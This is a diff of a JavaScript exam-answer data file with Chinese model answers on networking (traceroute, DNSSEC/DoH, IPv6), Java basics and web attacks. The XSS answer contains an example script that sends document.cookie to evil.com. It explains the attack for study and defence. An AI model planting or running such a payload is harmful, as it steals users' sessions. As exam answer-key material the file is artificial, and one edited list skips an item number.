@@ -648,11 +648,10 @@ const EXAM_DATA_PART1 = [
 (三) 請就以下 5 種測試矩陣維度：協定/埠號、封包大小、時間、路徑、觀察邊界設備，排查該現象（包含從遠端測回）？（10分）`,
       answer: `
 **(一) TTL/ICMP 在路徑追蹤扮演的角色（5分）**
-traceroute 的核心原理是「刻意製造 TTL 過期」。
-TTL 是 IP 標頭欄位，每經過一台 router 減 1，減為 0 時 router 丟棄該封包並回送 ICMP Time Exceeded 給來源端。
-traceroute 利用此機制，從 TTL=1 起逐步遞增，每次由第 N 跳回應的 ICMP 得知該跳 router 的位址與 RTT，進而還原完整路徑。
-抵達目的端時，依探測協定回 ICMP Port Unreachable（UDP 探測）或 Echo Reply（ICMP 探測）。
-因此 **TTL 負責逐跳定位**，**ICMP 負責回報與量測**；但回程 ICMP 走的路徑不一定與去程相同，且中間節點可能對 ICMP 限速，解讀時要留意。
+- TTL 是 IP 標頭欄位，每經過一台 router 減 1，減為 0 時 router 丟棄該封包並回送 ICMP Time Exceeded 給來源端。
+- traceroute 利用此機制，從 TTL=1 起逐步遞增，每次由第 N 跳回應的 ICMP 得知該跳 router 的位址與 RTT，進而還原完整路徑。
+- 抵達目的端時，依探測協定回 ICMP Port Unreachable（UDP 探測）或 Echo Reply（ICMP 探測）。
+- 因此 **TTL 負責逐跳定位**，**ICMP 負責回報與量測**；但回程 ICMP 走的路徑不一定與去程相同，且中間節點可能對 ICMP 限速，解讀時要留意。
 
 **(二) 非對稱路徑出現的原因（10分）**
 非對稱路由（Asymmetric Routing）指「去程路徑」與「回程路徑」不一致。
@@ -762,9 +761,7 @@ traceroute 利用此機制，從 TTL=1 起逐步遞增，每次由第 N 跳回�
 | 無法防範 | 解析器本身被投毒或回傳假資料 | 查詢內容被竊聽 |
 
 **五、企業實務建議**
-- 企業內部部署自建加密遞迴解析器（支援 DoT/DoH），並啟用 DNSSEC 驗證。
-- 自家網域做 DNSSEC 簽章，防止外界收到偽造的企業網域記錄。
-- 管控員工端自行使用外部 DoH，避免繞過企業的 DNS 過濾與資安監控。
+- 企業自建（或指定）支援 DNSSEC 驗證的遞迴解析器，對內提供 DoT/DoH，並強制員工端使用，封鎖未授權的外部 DoH/DoT。
 
 **結論**：DoH/DoT 確保「查詢過程不被看見或改動」，DNSSEC 確保「拿到的答案是真的」，兩者合用才能同時達成機密性與真實性，構成端到端較完整的 DNS 防護。`,
       code: null
@@ -782,10 +779,10 @@ traceroute 利用此機制，從 TTL=1 起逐步遞增，每次由第 N 跳回�
 | **標頭大小** | 可變長度（20–60 bytes，含 Options） | **固定 40 bytes** 基本標頭，額外功能改用「延伸標頭（Extension Header）」串接，加快路由器處理 |
 | **鄰居探索** | 使用 **ARP**（廣播）解析 MAC | 使用 **NDP（Neighbor Discovery Protocol）**，基於 ICMPv6 + multicast，並含路由器探索、位址自動設定 |
 | **分片** | 來源端與路徑上路由器皆可分片 | **僅來源端可分片**，路由器不分片；改由來源端先做 Path MTU Discovery |
-| **QoS 標記欄位** | ToS（Type of Service）欄位 | **Traffic Class** + **Flow Label（流標籤）** 欄位，可標記同一資料流以利特殊處理 |
-| **總長度欄位** | Total Length（標頭＋資料），標頭長度由 IHL 表示 | **Payload Length**（不含基本標頭） |
-| **DNS 解析** | 使用 **A 紀錄**（IPv4 位址） | 使用 **AAAA 紀錄**（IPv6 位址）；反解網域為 ip6.arpa |
-| **行動路由模式** | Mobile IPv4，需「三角繞送」經 Home Agent，效率較差 | Mobile IPv6，支援**路由最佳化（Route Optimization）**，通訊對端可直接與行動節點通訊，免三角繞送 |
+| **QoS 標記欄位** | ToS（DSCP/ECN） | **Traffic Class** + **Flow Label（流標籤）** 欄位，可標記同一資料流以利特殊處理 |
+| **總長度欄位** | Total Length（標頭＋資料）| **Payload Length**（不含基本標頭 40 bytes，但含延伸標頭） |
+| **DNS 解析** | 使用 **A 紀錄**（IPv4 位址）;反向解析 in-addr.arpa | 使用 **AAAA 紀錄**（IPv6 位址）；反向解析 ip6.arpa |
+| **行動路由模式** | Mobile IPv4 使用 Home Agent + Foreign Agent，封包需經家鄉代理人轉送（三角路由） | Mobile IPv6 取消 Foreign Agent，支援**路由最佳化（Route Optimization）**，通訊對端可直接與行動節點通訊 |
 
 **重點異同總結**
 - **相同點**：兩者皆為網路層協定、皆採無連線（connectionless）封包傳遞、皆有 TTL（IPv6 改稱 Hop Limit）概念。
@@ -875,24 +872,24 @@ int main() {
 **(一) 基本型別 vs 參考型別（5分）**
 | 比較項 | 基本型別 Primitive | 參考型別 Reference |
 |---|---|---|
-| 種類 | byte, short, int, long, float, double, char, boolean（共 8 種） | 類別、介面、陣列、列舉（Enum） |
+| 種類 | 整數（byte、short、int、long）、浮點（float、double）、字元（char）、布林（boolean）| 類別、介面、陣列、String、列舉（Enum） |
 | 儲存內容 | 變數直接存放「實際的值」 | 變數存放的是物件的「參考（位址）」|
 | 記憶體位置 | 區域變數放在堆疊（Stack） | 參考放在 Stack，物件實體放在 Heap |
-| 預設值 | 0 / 0.0 / false / '\\u0000' | null |
-| 方法呼叫 | call-by-value（複製實際的值） | call-by-value（複製參考的值，兩者指向同一物件）|
 | 是否可為 null | 不可 | 可 |
-
+| 預設值 | 成員變數有預設值（0、false 等），區域變數無 | 預設為 null |
+| 傳遞方式 | call-by-value（複製實際的值） | call-by-value（複製參考的值）|
+| 比較 | \`==\` 比值 | \`==\` 比位址，\`equals()\` 比內容 |
 例：\`int a = 5;\` 變數 a 裡就是 5；\`String s = new String("hi");\` 變數 s 裡是一個位址，"hi" 物件在 Heap。
 
 **(二) 垃圾回收機制（GC）（6分）**
 *如何運作（3分）*
 - **判斷垃圾（可達性分析）**：從 GC Roots 出發（stack 中的區域變數、靜態變數、活動執行緒等），沿參考鏈走訪，可到達的物件視為存活；無法到達的即為垃圾。
 - **回收垃圾**（常見演算法）：標記-清除（Mark-Sweep）、標記-整理（Mark-Compact）、複製（Copying）。
-- **分代回收**：heap 分為年輕代（Eden＋Survivor）與老年代。新物件先配置在 Eden，存活者經 Minor GC 移至 Survivor，多次存活後晉升老年代。因為多數物件生命週期很短，分代能提高回收效率。
+- **分代回收**：heap 分為年輕代（Eden＋兩個 Survivor）與老年代。新物件配置在 Eden，經 Minor GC 存活後年齡增加，達門檻晉升老年代。[nb]因為多數物件生命週期很短，分代能提高回收效率。
 
 *何時觸發（3分）*
 - **Minor GC**：Eden 空間不足時觸發，只回收年輕代，速度快。
-- **Major／Full GC**：老年代空間不足（含物件晉升失敗）時觸發，回收整個 heap，耗時較長。
+- **Full GC**：老年代空間不足（含物件晉升失敗）時觸發，回收整個 heap，耗時較長。
 - 主動呼叫 \`System.gc()\` ：只是向 JVM 提出建議，是否執行由 JVM 決定。
 
 **(三) 物件導向三大特性（9分）**
@@ -983,15 +980,14 @@ public class Main {
 
 **防禦方式**：
 1. **參數化查詢 / Prepared Statement**：將 SQL 結構與資料分離，輸入永遠被當作「資料」而非「指令」。
-2. **輸入驗證（白名單）**：限制輸入的型別、格式與長度，只允許預期的內容。
-3. 使用 ORM 框架：預設使用參數化查詢。
-4. 最小權限原則：應用程式連線帳號只給必要權限。
+2. **輸入驗證（白名單）**：限制輸入的型別、格式與長度，不符合格式即拒絕。
+4. 最小權限原則：資料庫帳號僅給必要權限。
 5. 關閉錯誤訊息：避免洩漏資料庫結構。
 6. 其他：部署 WAF（Web 應用程式防火牆）、定期弱點掃描與滲透測試。
 
 **(二) Cross-Site Scripting, XSS（跨站腳本攻擊）（5分）**
 
-**行為原理**：應用程式未對使用者輸入做適當處理，就把內容輸出到網頁，攻擊者便能注入惡意 JavaScript。[nb]其他使用者瀏覽該頁面時，瀏覽器因信任該網站而執行惡意腳本，攻擊者即可竊取 cookie、session，冒充使用者。
+**行為原理**：網站未對使用者輸入做適當處理，就把內容輸出到網頁，攻擊者便能注入惡意 JavaScript。[nb]其他使用者瀏覽該頁面時，瀏覽器因信任該網站而執行惡意腳本，攻擊者即可竊取 cookie、session，冒充使用者。
 - **範例**：在留言版輸入 \`<script>fetch('https://evil.com?c=' + document.cookie)<\/script>\`，網站若直接顯示，所有看到該留言的人都會把 cookie 送給攻擊者。
 - **危害**：竊取 session 冒充身分、竄改頁面內容、導向惡意網站、側錄鍵盤輸入。
 三種類型：
@@ -1022,7 +1018,7 @@ public class Main {
 
 **總結**
 - SQL Injection：資料被當成 SQL 指令執行（目標：資料庫）。
-- XSS：資料被當成 網頁程式碼執行（目標：使用者瀏覽器）。
+- XSS：資料被當成網頁程式碼執行（目標：使用者瀏覽器）。
 - CSRF：偽造請求借用使用者的登入身分（目標：已登入的網站）。`,
       code: null
     }
